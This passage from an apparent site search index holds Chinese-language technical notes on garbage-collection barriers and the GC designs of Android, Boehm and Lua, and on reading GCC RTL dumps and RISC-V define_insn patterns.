\u200b\u64cd\u4f5c\u200b\u5bf9\u8c61\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u63d2\u5165\u200b\u989d\u5916\u200b\u7684\u200b read/write barrier\uff0c\u200b\u4ece\u800c\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ol> <li>Steele write barrier\uff1a\u200b\u5982\u679c\u200b\u5efa\u7acb\u200b\u4e86\u200b\u4e00\u6761\u200b\u4ece\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u5230\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u7684\u200b\u8fb9\u200b\uff0c\u200b\u628a\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u53d8\u6210\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b</li> <li>Dijkstra et al. write barrier\uff1a\u200b\u5982\u679c\u200b\u5efa\u7acb\u200b\u4e86\u200b\u4e00\u6761\u200b\u4ece\u200b\u9ed1\u8272\u200b\u5bf9\u8c61\u200b\u5230\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u7684\u200b\u8fb9\u200b\uff0c\u200b\u628a\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u53d8\u6210\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b</li> <li>Baker read barrier: \u200b\u5982\u679c\u200b\u8bfb\u53d6\u200b\u4e86\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u91cc\u200b\u7684\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b\u767d\u8272\u200b\u5bf9\u8c61\u200b\u53d8\u6210\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b</li> </ol>"},{"location":"software/gc.html#_2","title":"\u6848\u4f8b\u200b\u5206\u6790","text":""},{"location":"software/gc.html#android-gc","title":"Android \u200b\u7684\u200b GC \u200b\u5b9e\u73b0","text":"<p>\u200b\u53c2\u8003\u200b Collecting the Garbage: A brief history of GC over Android versions \u200b\u548c\u200b Debug ART garbage collection\uff0cAndroid \u200b\u7684\u200b GC \u200b\u5b9e\u73b0\u200b\u7ecf\u5386\u200b\u8fc7\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ol> <li>Dalvik GC\uff08\u200b\u76f4\u5230\u200b Android KitKat \u200b\u7248\u672c\u200b\u5373\u200b Android 4.4)\uff1astop the world, Concurrent Mark-And-Sweep</li> <li>Android Runtime GC\uff0c\u200b\u4ece\u200b Lollipop (Android 5) \u200b\u5f00\u59cb\u200b\u5230\u200b Marshamallow (Android 6): Concurrent Mark-And-Sweep + Generational</li> <li>Android Runtime GC\uff0c\u200b\u4ece\u200b Oreo\uff08Android 8\uff09\u200b\u5f00\u59cb\u200b\uff1aConcurrent Copying\uff08<code>Starting with Android 8 (Oreo), the default plan is Concurrent Copying (CC).</code>\uff09</li> <li>Android Runtime GC\uff0c\u200b\u4ece\u200b Q\uff08Android 10\uff09\u200b\u5f00\u59cb\u200b\uff1aConcurrent Copying + Generational\uff08<code>CC extends to be a generational GC in Android 10 and higher.</code>\uff09</li> </ol> <p>\u200b\u5b9e\u73b0\u200b Concurrent Copying \u200b\u65f6\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8ba9\u200b mutator \u200b\u548c\u200b collector \u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e86\u200b read barrier\u3002</p>"},{"location":"software/gc.html#boehm-gc","title":"Boehm GC","text":"<p>Boehm GC \u200b\u662f\u200b\u4e00\u4e2a\u200b C/C++ \u200b\u4e0a\u200b\u7684\u200b\u5783\u573e\u200b\u56de\u6536\u200b\u5668\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8bed\u8a00\u200b\u672c\u8eab\u200b\u6ca1\u6709\u200b\u63d0\u4f9b\u200b\u673a\u5236\u200b\uff0c\u200b\u6240\u4ee5\u200b Boehm GC \u200b\u662f\u200b\u4fdd\u5b88\u200b\u7684\u200b\uff1a\u200b\u5b83\u4f1a\u200b\u626b\u63cf\u200b\u6808\u200b\u3001\u200b\u5806\u200b\u548c\u200b\u6570\u636e\u200b\u6bb5\u200b\uff0c\u200b\u628a\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u662f\u200b\u6307\u9488\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u5f53\u4f5c\u200b\u6307\u9488\u200b\u53bb\u200b\u770b\u5f85\u200b\u3002\u200b\u7531\u4e8e\u200b\u6ca1\u6cd5\u200b\u4fee\u6539\u200b\u7a0b\u5e8f\u200b\u672c\u8eab\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e3a\u4e86\u200b\u76d1\u6d4b\u200b\u7a0b\u5e8f\u4fee\u6539\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u53bb\u200b\u5229\u7528\u200b\u5185\u6838\u200b\u7684\u200b\u9875\u200b\u7684\u200b\u673a\u5236\u200b\u53bb\u200b\u6355\u6349\u200b\u8fd9\u4e9b\u200b\u4fee\u6539\u200b\uff0c\u200b\u4f8b\u5982\u200b mmap \u200b\u6210\u200b\u4e0d\u53ef\u200b\u5199\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5904\u7406\u200b\u5f02\u5e38\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p>"},{"location":"software/gc.html#lua","title":"Lua","text":"<p>Lua 4.0 \u200b\u7684\u200b GC \u200b\u5b9e\u73b0\u200b\u662f\u200b\u7b80\u5355\u200b\u7684\u200b Mark Sweep \u200b\u7b97\u6cd5\u200b\uff1algc.c\uff0c\u200b\u4ece\u200b root set \u200b\u904d\u5386\u200b\u5404\u4e2a\u200b\u5bf9\u8c61\u200b\u8fdb\u884c\u200b\u6807\u8bb0\u200b\uff0c\u200b\u7136\u540e\u200b\u904d\u5386\u200b\u6240\u6709\u200b\u5206\u914d\u200b\u4e86\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u56de\u6536\u200b\u90a3\u4e9b\u200b\u6ca1\u6709\u200b\u88ab\u200b\u6807\u8bb0\u200b\u7684\u200b\u5bf9\u8c61\u200b\u3002</p> <p>Lua 5.1 \u200b\u5b9e\u73b0\u200b\u4e86\u200b Incremental Mark Sweep\uff0c\u200b\u4e4b\u540e\u200b\u7684\u200b Lua 5.2-5.4 \u200b\u7248\u672c\u200b\u8fed\u4ee3\u200b\u4e86\u200b Generational GC\u3002</p>"},{"location":"software/gc.html#_3","title":"\u53c2\u8003","text":"<ul> <li>The Garbage Collection Handbook - The art of automatic memory management</li> <li>Algorithms for Dynamic Memory Management (236780) Lecture 2 by Erez Petrank</li> <li>Garbage Collection in Lua by Roberto Ierusalimschy</li> <li>Notes on the Implementation of Lua 5.3 - Garbage Collection</li> </ul>"},{"location":"software/gcc.html","title":"GCC Internals","text":"<p>\u200b\u672c\u6587\u200b\u662f\u200b\u5bf9\u200b GNU Compiler Collection Internals \u200b\u6587\u6863\u200b\u7684\u200b\u6574\u7406\u200b\u548c\u200b\u603b\u7ed3\u200b\u3002\u200b\u6587\u7ae0\u200b\u5f15\u7528\u200b\u4e86\u200b\u90e8\u5206\u200b GCC \u200b\u6e90\u7801\u200b\u3002</p>"},{"location":"software/gcc.html#rtl","title":"RTL","text":""},{"location":"software/gcc.html#rtl_1","title":"\u67e5\u770b\u200b RTL","text":"<p>GCC \u200b\u7684\u200b RTL \u200b\u662f\u200b\u91c7\u7528\u200b Lisp \u200b\u8bed\u8a00\u200b\u63cf\u8ff0\u200b\u7684\u200b\u4f4e\u5c42\u6b21\u200b\u7684\u200b\u4e2d\u95f4\u200b\u8bed\u8a00\u200b\uff0c\u200b\u662f\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u673a\u5668\u6307\u4ee4\u200b\u524d\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u8868\u793a\u200b\u3002\u200b\u5728\u200b\u751f\u6210\u200b\u6c47\u7f16\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b <code>-dP</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6700\u540e\u200b\u7684\u200b RTL \u200b\u548c\u200b\u6c47\u7f16\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff1a</p> <pre><code>#(insn 13 8 14 (set (reg/i:DI 10 a0)\n#        (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n#                (reg:SI 11 a1 [78])))) \"kb.c\":3:1 21 {*mulsi3_extended}\n#     (expr_list:REG_DEAD (reg:SI 11 a1 [78])\n#        (nil)))\n        mulw    a0,a0,a1        # 13    [c=20 l=4]  *mulsi3_extended\n#(jump_insn 21 20 22 (simple_return) \"kb.c\":3:1 246 {simple_return}\n#     (nil)\n# -&gt; simple_return)\n        ret             # 21    [c=0 l=4]  simple_return\n</code></pre> <p>\u200b\u5982\u679c\u200b\u60f3\u8981\u200b dump \u200b\u51fa\u200b\u6bcf\u4e2a\u200b RTL pass \u200b\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b\uff1a<code>-fdump-rtl-all</code>\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5f62\u200b\u5982\u200b\u4e0b\u9762\u200b\u7684\u200b RTL \u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>;; Function mul (mul, funcdef_no=0, decl_uid=1488, cgraph_uid=1, symbol_order=0)\n\n(note 1 0 5 NOTE_INSN_DELETED)\n(note 5 1 19 [bb 2] NOTE_INSN_BASIC_BLOCK)\n(note 19 5 2 NOTE_INSN_PROLOGUE_END)\n(note 2 19 3 NOTE_INSN_DELETED)\n(note 3 2 4 NOTE_INSN_DELETED)\n(note 4 3 7 NOTE_INSN_FUNCTION_BEG)\n(note 7 4 8 NOTE_INSN_DELETED)\n(note 8 7 13 NOTE_INSN_DELETED)\n(insn 13 8 14 (set (reg/i:DI 10 a0)\n        (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n                (reg:SI 11 a1 [78])))) \"kb.c\":3:1 21 {*mulsi3_extended}\n     (expr_list:REG_DEAD (reg:SI 11 a1 [78])\n        (nil)))\n(insn 14 13 20 (use (reg/i:DI 10 a0)) \"kb.c\":3:1 -1\n     (nil))\n(note 20 14 21 NOTE_INSN_EPILOGUE_BEG)\n(jump_insn 21 20 22 (simple_return) \"kb.c\":3:1 246 {simple_return}\n     (nil)\n -&gt; simple_return)\n(barrier 22 21 18)\n(note 18 22 0 NOTE_INSN_DELETED)\n</code></pre>"},{"location":"software/gcc.html#rtl_2","title":"\u9605\u8bfb\u200b RTL","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b RTL \u200b\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b S-exp\uff0c\u200b\u6bcf\u4e2a\u200b S-exp \u200b\u7684\u200b\u524d\u200b\u4e09\u4e2a\u200b\u6574\u6570\u200b\u53c2\u6570\u200b\u5206\u522b\u200b\u662f\u200b id\uff0cprev \u200b\u548c\u200b next\uff0c\u200b\u8868\u793a\u200b\u4e00\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u3002\u200b\u6838\u5fc3\u200b\u662f\u200b\u8981\u200b\u770b\u200b (insn) \u200b\u7684\u200b\u7b2c\u56db\u4e2a\u200b\u53c2\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>(set (reg/i:DI 10 a0)\n        (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n                (reg:SI 11 a1 [78]))))\n</code></pre> <p>\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u6307\u4ee4\u200b\u7684\u200b\u4f5c\u7528\u200b\u662f\u200b\uff0c\u200b\u628a\u200b int32 \u200b\u7c7b\u578b\u200b\u7684\u200b a0 \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u4e58\u4ee5\u200b int32 \u200b\u7c7b\u578b\u200b\u7684\u200b a1 \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u7ed3\u679c\u200b\u7b26\u53f7\u200b\u6269\u5c55\u200b\u5230\u200b int64\uff0c\u200b\u5199\u5165\u200b\u5230\u200b a0 \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u3002\u200b\u5176\u4e2d\u200b\u8868\u793a\u200b\u7c7b\u578b\u200b\u7684\u200b\u662f\u200b DI/SI\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u540d\u5b57\u200b\u548c\u200b\u4f4d\u6570\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff1a</p> <ul> <li>\u200b\u6574\u6570\u200b\uff1aB(Bit)I=1, Q(Quarter)I=8, H(Half)I=16, S(Single)I=32, D(Double)I=64, T(Tetra)I=128</li> <li>\u200b\u6d6e\u70b9\u200b\uff1aQ(Quarter)F=8, H(Half)F=16, S(Single)F=32, D(Double)F=64, T(Tetra)F=128</li> <li>\u200b\u5341\u8fdb\u5236\u200b\u6d6e\u70b9\u200b\uff1a*D</li> <li>\u200b\u5b9a\u70b9\u6570\u200b\uff08_Fract\uff09\uff1a*Q\uff0c\u200b\u65e0\u200b\u7b26\u53f7\u200b\u5728\u200b\u5f00\u5934\u200b\u52a0\u200b U</li> <li>\u200b\u7d2f\u52a0\u5668\u200b\uff08_Accum\uff09\uff1a*A\uff0c\u200b\u65e0\u200b\u7b26\u53f7\u200b\u5728\u200b\u5f00\u5934\u200b\u52a0\u200b U</li> <li>\u200b\u590d\u6570\u200b\uff1a*C</li> </ul> <p>\u200b\u7a0d\u5fae\u200b\u548c\u200b\u4e60\u60ef\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b Q \u200b\u8868\u793a\u200b Quarter \u200b\u800c\u200b\u4e0d\u662f\u200b Quad\u3002</p> <p>\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u8868\u793a\u200b\u65b9\u5f0f\u200b\u662f\u200b <code>(reg:m n)</code>\uff1a</p> <pre><code>(reg/i:DI 10 a0)\n(reg:SI 10 a0 [77])\n(reg:SI 11 a1 [78])\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b DI/SI \u200b\u5c31\u662f\u200b\u7c7b\u578b\u200b\uff0c10/11 \u200b\u662f\u200b\u5bc4\u5b58\u5668\u200b\u7f16\u53f7\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b a0/a1 \u200b\u662f\u200b\u5bc4\u5b58\u5668\u200b 10/11 \u200b\u5728\u200b RISC-V \u200b\u67b6\u6784\u200b\u91cc\u200b\u7684\u200b ABI \u200b\u540d\u79f0\u200b\u3002<code>/i</code> \u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u51fd\u6570\u200b\u7684\u200b\u8fd4\u56de\u503c\u200b\uff08<code>REG_FUNCTION_VALUE_P(x)</code>\uff09\u3002</p>"},{"location":"software/gcc.html#_1","title":"\u6307\u4ee4\u200b\u6a21\u677f","text":"<p>\u200b\u540c\u4e00\u200b\u884c\u200b\u6700\u540e\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b <code>{*mulsi3_extended}</code>\uff0c\u200b\u8fd9\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u8fd9\u200b\u4e00\u4e2a\u200b insn \u200b\u5bf9\u5e94\u200b\u4e86\u200b\u54ea\u200b\u4e00\u4e2a\u200b\u89c4\u5219\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u5728\u200b riscv.md \u200b\u4e2d\u200b\u627e\u5230\u200b\uff1a</p> <pre><code>(define_insn \"mulsi3_extended\"\n  [(set (match_operand:DI              0 \"register_operand\" \"=r\")\n    (sign_extend:DI\n        (mult:SI (match_operand:SI 1 \"register_operand\" \" r\")\n             (match_operand:SI 2 \"register_operand\" \" r\"))))]\n  \"(TARGET_ZMMUL || TARGET_MUL) &amp;&amp; TARGET_64BIT\"\n  \"mulw\\t%0,%1,%2\"\n  [(set_attr \"type\" \"imul\")\n   (set_attr \"mode\" \"SI\")])\n</code></pre> <p>\u200b\u8fd9\u200b\u8868\u793a\u200b\u4e00\u4e2a\u200b\u6a21\u5f0f\u5339\u914d\u200b\u7684\u200b\u89c4\u5219\u200b\uff0c\u200b\u6784\u6210\u200b\u4e86\u200b\u4ece\u200b RTL \u200b\u5230\u200b\u6307\u4ee4\u200b\u7684\u200b\u6620\u5c04\u200b\u5173\u7cfb\u200b\u3002\u200b\u6a21\u5f0f\u5339\u914d\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\uff1a</p> <pre><code>  [(set (match_operand:DI              0 \"register_operand\" \"=r\")\n    (sign_extend:DI\n        (mult:SI (match_operand:SI 1 \"register_operand\" \" r\")\n             (match_operand:SI 2 \"register_operand\" \" r\"))))]\n</code></pre> <p>\u200b\u610f\u601d\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5339\u914d\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u5e94\u5f53\u200b\u662f\u200b\u5bc4\u5b58\u5668\u200b\u64cd\u4f5c\u6570\u200b\uff08<code>register_operand</code>\uff0c<code>r</code> \u200b\u8868\u793a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff09\uff0c\u200b\u7c7b\u578b\u200b\u662f\u200b int32\uff08<code>:SI</code>\uff09\uff0c\u200b\u64cd\u4f5c\u6570\u200b\u4e58\u6cd5\u200b\u540e\u200b\u7b26\u53f7\u200b\u6269\u5c55\u200b\u5230\u200b int64\uff08<code>:DI</code>\uff09\uff0c\u200b\u6700\u540e\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u76ee\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff08<code>register_operand</code>\uff0c\u200b\u7c7b\u578b\u200b\u662f\u200b int64 <code>:DI</code>\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b <code>r</code>\uff0c<code>=</code> \u200b\u8868\u793a\u200b\u5199\u5165\u200b\uff0c\u200b\u65e7\u200b\u6570\u636e\u200b\u4e22\u5f03\u200b\uff09\u3002\u200b\u6ee1\u8db3\u200b\u8fd9\u4e9b\u200b\u8981\u6c42\u200b\uff0c\u200b\u5c31\u200b\u5339\u914d\u200b\u4e0a\u200b\u4e86\u200b <code>mulsi3_extended</code>\u3002</p> <p>\u200b\u4e0b\u200b\u4e00\u884c\u200b\uff1a</p> <pre><code>  \"(TARGET_ZMMUL || TARGET_MUL) &amp;&amp; TARGET_64BIT\"\n</code></pre> <p>\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u989d\u5916\u200b\u7684\u200b\u6761\u4ef6\u200b\uff0c\u200b\u7528\u200b C \u200b\u4ee3\u7801\u200b\u7f16\u5199\u200b\u3002\u200b\u6bd4\u5982\u200b\u8fd9\u91cc\u200b\u8981\u200b\u7528\u5230\u200b mulw \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u5f53\u524d\u200b\u7684\u200b target \u200b\u4e0d\u200b\u652f\u6301\u200b\u8fd9\u4e2a\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u4e0d\u8981\u200b\u751f\u6210\u200b mulw \u200b\u6307\u4ee4\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u5c31\u8981\u200b\u5236\u5b9a\u200b\u9650\u5236\u200b\u6761\u4ef6\u200b\uff1a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\u3002</p> <p>\u200b\u518d\u4e0b\u200b\u4e00\u884c\u200b\u5c31\u662f\u200b\u8f93\u51fa\u200b\u7684\u200b\u6307\u4ee4\u200b\uff1a</p> <pre><code>  \"mulw\\t%0,%1,%2\"\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>%0</code> <code>%1</code> <code>%2</code> \u200b\u5c31\u200b\u4f1a\u200b\u66ff\u6362\u200b\u4e3a\u200b\u524d\u9762\u200b\u5339\u914d\u200b\u5f97\u5230\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u6ce8\u610f\u200b\u524d\u9762\u200b <code>match_operand</code> \u200b\u540e\u200b\u7684\u200b\u6574\u6570\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7f16\u53f7\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u91cc\u200b\u548c\u200b GCC \u200b\u5185\u8054\u200b\u6c47\u7f16\u200b\u7684\u200b\u8bed\u6cd5\u200b\u7279\u522b\u200b\u76f8\u4f3c\u200b\uff0c\u200b\u5305\u62ec\u200b\u524d\u9762\u200b <code>match_operand</code> \u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b\uff1a<code>=r</code> \u200b\u548c\u200b <code>r</code>\uff0c\u200b\u5176\u5b9e\u200b\u548c\u200b\u5185\u8054\u200b\u6c47\u7f16\u200b\u91cc\u200b\u5bf9\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b specifier \u200b\u4e5f\u200b\u662f\u200b\u975e\u5e38\u200b\u50cf\u200b\u7684\u200b\u3002</p> <pre><code>  [(set_attr \"type\" \"imul\")\n   (set_attr \"mode\" \"SI\")])\n</code></pre> <p>\u200b\u6700\u540e\u200b\u662f\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u5c5e\u6027\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u662f\u200b\u7528\u6765\u200b\u7ed9\u200b\u8fd0\u7b97\u200b\u6807\u8bb0\u200b\u7c7b\u578b\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8981\u200b\u9488\u5bf9\u200b\u5904\u7406\u5668\u200b\u6d41\u6c34\u7ebf\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u6bcf\u4e2a\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u88ab\u200b\u5206\u5230\u200b\u54ea\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u91cc\u9762\u200b\u3002</p> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b\u683c\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>(define_insn\n  [insn-pattern]\n  \"condition\"\n  \"output-template\"\n  [insn-attribute])\n</code></pre> <p>\u200b\u5ffd\u7565\u200b\u4e86\u200b\u53ef\u9009\u200b\u7684\u200b\u547d\u540d\u200b\u3002</p>"},{"location":"software/gcc.html#_2","title":"\u4f8b\u5b50\u200b\u56de\u987e","text":"<p>\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\u5f00\u5934\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>#(insn 13 8 14 (set (reg/i:DI 10 a0)\n#        (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n#                (reg:SI 11 a1 [78])))) \"kb.c\":3:1 21 {*mulsi3_extended}\n#     (expr_list:REG_DEAD (reg:SI 11 a1 [78])\n#        (nil)))\n        mulw    a0,a0,a1        # 13    [c=20 l=4]  *mulsi3_extended\n</code></pre> <p>\u200b\u8fd9\u200b\u4e00\u4e2a\u200b insn \u200b\u4e0e\u200b mulsi3_extended \u200b\u76f8\u5339\u914d\u200b\uff0c\u200b\u64cd\u4f5c\u6570\u200b 0 \u200b\u5339\u914d\u200b\u5230\u200b\u4e86\u200b <code>(reg/i:DI 10 a0)</code>\uff0c\u200b\u64cd\u4f5c\u6570\u200b 1 \u200b\u5339\u914d\u200b\u5230\u200b\u4e86\u200b <code>(reg:SI 10 a0 [77])</code>\uff0c\u200b\u64cd\u4f5c\u6570\u200b 2 \u200b\u5339\u914d\u200b\u5230\u200b\u4e86\u200b <code>(reg:SI 11 a1 [78])</code>\uff0c\u200b\u6240\u4ee5\u200b\u6700\u540e\u200b\u751f\u6210\u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u540d\u5b57\u200b\u586b\u200b\u8fdb\u53bb\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b <code>mulw a0,a0,a1</code>\u3002</p> <p>\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u5728\u200b C \u200b\u4ee3\u7801\u200b\u4e2d\u200b\u751f\u6210\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>simple_return</code>\uff1a</p> <pre><code>(define_insn \"simple_return\"\n  [(simple_return)]\n  \"\"\n{\n  return riscv_output_return ();\n}\n  [(set_attr \"type\" \"jump\")\n   (set_attr \"mode\" \"none\")])\n</code></pre> <p>\u200b\u90a3\u4e48\u200b\u5339\u914d\u200b\u4ee5\u540e\u200b\uff0c\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>riscv_output_return</code> \u200b\u51fd\u6570\u200b\uff1a</p> <pre><code>const char *\nriscv_output_return ()\n{\n  if (cfun-&gt;machine-&gt;naked_p)\n    return \"\";\n\n  return \"ret\";\n}\n</code></pre> <p>\u200b\u5b9e\u73b0\u200b\u4e5f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u9664\u4e86\u200b naked \u200b\u51fd\u6570\u200b\u4ee5\u5916\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u4e00\u6761\u200b ret \u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"software/gcc.html#_3","title":"\u539f\u7406\u200b\u63a2\u7a76","text":"<p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u5728\u200b <code>riscv.md</code> \u200b\u4e2d\u5199\u200b\u6a21\u5f0f\u5339\u914d\u200b\u7684\u200b\u65f6\u5019\u200b\uff1a</p> <pre><code>  [(set (match_operand:DI              0 \"register_operand\" \"=r\")\n    (sign_extend:DI\n        (mult:SI (match_operand:SI 1 \"register_operand\" \" r\")\n             (match_operand:SI 2 \"register_operand\" \" r\"))))]\n</code></pre> <p>\u200b\u4f1a\u200b\u5728\u200b <code>gcc/insn-recog.cc</code> \u200b\u751f\u6210\u200b\u5982\u4e0b\u200b\u7684\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>// x1 = (set (reg/i:DI 10 a0)\n//           (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n//                   (reg:SI 11 a1 [78]))))\nstatic int\nrecog_7 (rtx x1 ATTRIBUTE_UNUSED,\n    rtx_insn *insn ATTRIBUTE_UNUSED,\n    int *pnum_clobbers ATTRIBUTE_UNUSED)\n{\n  rtx * const operands ATTRIBUTE_UNUSED = &amp;recog_data.operand[0];\n  rtx x2, x3, x4, x5, x6;\n  int res ATTRIBUTE_UNUSED;\n  // x2 = (reg/i:DI 10 a0)\n  x2 = XEXP (x1, 0);\n  // operands[0] = (reg/i:DI 10 a0)\n  operands[0] = x2;\n  // x3 = (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n  //                      (reg:SI 11 a1 [78])))\n  x3 = XEXP (x1, 1);\n  // x4 = (mult:SI (reg:SI 10 a0 [77])\n  //               (reg:SI 11 a1 [78]))\n  x4 = XEXP (x3, 0);\n  switch (GET_CODE (x4))\n    {\n    case MULT:\n      if (pattern14 (x3, E_SImode) != 0\n          || !\n#line 869 \"/home/jiegec/ct-ng/.build/riscv64-unknown-linux-gnu/src/gcc/gcc/config/riscv/riscv.md\"\n(TARGET_MUL &amp;&amp; TARGET_64BIT))\n        return -1;\n      return 21; /* *mulsi3_extended */\n    }\n}\n</code></pre> <pre><code>// x1 = (sign_extend:DI (mult:SI (reg:SI 10 a0 [77])\n//                      (reg:SI 11 a1 [78])))\nstatic int\npattern14 (rtx x1, machine_mode i1)\n{\n  rtx * const operands ATTRIBUTE_UNUSED = &amp;recog_data.operand[0];\n  rtx x2, x3, x4;\n  int res ATTRIBUTE_UNUSED;\n  // x2 = (mult:SI (reg:SI 10 a0 [77])\n  //               (reg:SI 11 a1 [78]))\n  // operands[0] = (reg/i:DI 10 a0)\n  x2 = XEXP (x1, 0);\n  if (GET_MODE (x2) != E_SImode\n      || !register_operand (operands[0], E_DImode)\n      || GET_MODE (x1) != E_DImode)\n    return -1;\n  // x3 = (reg:SI 10 a0 